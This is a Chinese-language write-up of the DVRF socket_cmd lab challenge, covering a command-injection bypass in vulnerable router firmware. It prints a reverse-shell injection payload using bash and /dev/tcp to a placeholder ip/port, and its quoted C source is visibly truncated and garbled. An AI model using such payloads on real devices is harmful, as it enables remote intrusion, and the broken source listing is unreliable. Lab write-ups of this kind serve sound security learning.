## 前言
这次的这道题目是 `DVRF` 的，程序是 `pwnable/ShellCode_Required/` 目录下的 `socket_cmd`
。题目涉及到了简单的命令注入的绕过。
## 漏洞分析
在 github 下直接查看源码：
    https://github.com/praetorian-inc/DVRF/blob/master/Pwnable%20Source/ShellCode_Required/socket_cmd.c
源码如下：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // Pwnable Socket Program
    // By b1ack0wl
    // Command Injection
    int main(int argc, char **argv[])
    {
    if (argc & /dev/tcp/ip/port 0>&1
但是这里直接使用的话是不起作用的，貌似是空格被截断了啥的。
所以这里我们需要使用`bash -c` 命令， **将`bash -i` 的这个命令作为他的参数传进去**，即：
    123;bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
在 `vps` 上开启一个监听端口，就可以正常弹回 `shell` 了
  * 原来以为 `snprintf` 函数存在栈溢出，但是其实只有 `sprintf` 才会溢出
## 总结
从这题的源码以及解题思路可以得出，在挖掘 IOT 固件漏洞的过程中，还可以尝试绑定的某个端口的 fuzz 的命令注入，或许会有意想不到的效果。
这题应该还有许多种绕过姿势的，这边就讲到的最简单的两种，使用 | 和 ; 符号进行注入。别的姿势大家可以自行挖掘和尝试。